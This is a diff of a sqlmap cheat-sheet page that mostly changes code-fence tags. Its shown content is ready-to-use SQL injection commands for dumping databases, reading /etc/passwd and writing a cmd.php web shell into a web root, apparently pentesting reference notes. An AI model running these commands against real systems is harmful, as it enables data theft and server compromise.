@@ -4,12 +4,11 @@ date: 2024-6-30
 tags: ["sqlmap", "sqli", "sql injection", "burpsuite"]
 ---
 
----
 ### sqlmap
 
 <div>
 
-```bash
+```console
 # In Burp Suite, we can right click the request and click `copy to file` to save the request
 # And add `*` to request to indicate the sql injection point
 ```
@@ -20,42 +19,42 @@ tags: ["sqlmap", "sqli", "sql injection", "burpsuite"]
 
 <div>
 
-```bash
+```console
 # Initial testing HTTP
 sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
 ```
 
-```bash
+```console
 # Initial testing HTTPS
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
 ```
 
-```bash
+```console
 # Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
 ```
 
-```bash
+```console
 # Get databases
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
 ```
 
-```bash
+```console
 # Get tables
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --tables
 ```
 
-```bash
+```console
 # Dump table
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> -T <TABLE_NAME> --dump
 ```
 
-```bash
+```console
 # Dump all tables (slow)
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --dump
 ```
 
-```bash
+```console
 # Specify technique
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
 ```
@@ -66,7 +65,7 @@ sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --thr
 
 <div>
 
-```
+```console
 +------------------------+
 | B: Boolean-based blind |
 | E: Error-based         |
@@ -83,27 +82,27 @@ sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --thr
 
 <div>
 
-```bash
+```console
 # File write
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
 ```
 
-```bash
+```console
 # Add payload tamper script, e.g. randomcase
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
 ```
 
-```bash
+```console
 # Check privileges
 sqlmap -r request --privileges
 ```
 
-```bash
+```console
 # Read a file
 sqlmap -r request --file-read=/etc/passwd
 ```
 
-```bash
+```console
 # Write a file
 sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
 ```
@@ -114,7 +113,7 @@ sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
 
 <div>
 
-```python
+```console
 #!/usr/bin/env python3
 
 from lib.core.enums import PRIORITY
